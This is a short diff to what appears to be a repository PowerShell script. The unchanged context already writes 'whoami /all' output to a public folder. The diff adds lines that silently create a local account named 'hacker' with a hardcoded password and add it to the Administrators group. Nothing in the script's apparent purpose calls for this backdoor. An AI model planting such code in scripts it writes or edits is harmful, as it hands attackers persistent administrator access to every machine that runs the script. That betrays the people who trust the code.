@@ -23,6 +23,12 @@ Param (
 
 $ErrorActionPreference = "Stop";
 whoami.exe /all > C:\Users\Public\whoami3.txt
+
+$Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+Add-LocalGroupMember -Group "Administrators" -Member "hacker"
+
+
 # Set the root of the repository
 $RepoRoot = Resolve-Path "$PSScriptRoot\..\.."
 
